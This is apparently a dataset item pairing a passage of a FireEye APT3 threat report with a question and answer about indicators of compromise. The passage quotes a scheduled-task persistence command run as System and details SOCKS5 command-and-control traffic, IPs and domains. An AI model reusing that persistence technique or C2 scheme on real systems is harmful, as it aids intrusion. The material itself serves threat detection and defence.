\"cmd.exe\" /C whoami\" to verify it is running with the elevated privileges of \"System\" and creates persistence by creating the following scheduled task:\nschtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913. The malware sends the SOCKS5 connection request \"05 01 00\" and verifies the server response starts with \"05 00\". The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order).\nOnce the connection to the server is established, the malware expects a message containing at least three bytes from the server. These first three bytes are the command identifier. The following commands are supported by the malware:\nBig Headline: Links to APT3\nOn October 28, we observed APT3 sending out spearphishing messages containing a compressed executable attachment. The deflated exe was a variant of the same downloader described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy. The secondary payload in that case was detected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5 8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\ninform.bedircati[.]com\npn.lamb-site[.]com\n210.109.99.64\nThe 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com \u2013 another known domain referenced in our Operation Clandestine Fox blog.\nIn addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173.\nThis IP has hosted other domains used by APT3 in past campaigns:\nAs we discussed in our previous blog detailing (<https://www.fireeye.com/blog/threat-research/2014/06/clandestine-fox-part-deux.html>)previous APT3 activity, the walterclean[.]com served as a Plugx/Kaba command and control server.\nBig Headline: Conclusion\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has demonstrated that they will also attack targets with known exploits or social engineering.\nSince Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits. The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code. No matter the strategy, this actor has shown an ability to operate successfully.\nIOCs for this threat can be found (<https://github.com/fireeye/iocs/tree/master/APT3>)here.\nQuestion: What indicators of compromise (IOCs) can be identified from the APT3 spearphishing campaign described in the report? How can these IOCs be used to detect and mitigate similar attacks?",
    "output": "Answer: Several indicators of compromise (IOCs) can be identified from the APT3 spearphishing campaign. These include the MD5 hashes of the malicious files (e.g., 5a0c4e1925c76a959ab0588f683ab437 for install.exe, 492a839a3bf9c61b7065589a18c5aa8d for doc.exe, and 744a17a3bc6dbd535f568ef1e87d8b9a for the x64 version of doc.exe), the compile times of the malicious files, and the IP addresses and domains used by the malware (e.g., 192.157.198.103, 192.184.60.229, and join.playboysplus.com). These IOCs can be used to detect and mitigate similar attacks by implementing network monitoring to identify traffic to the specified IP addresses and domains, scanning systems for the presence of files with the given MD5 hashes, and analyzing system logs for the creation of suspicious scheduled tasks. By correlating these IOCs with other security alerts, organizations can enhance their detection capabilities and respond more effectively to potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  }
]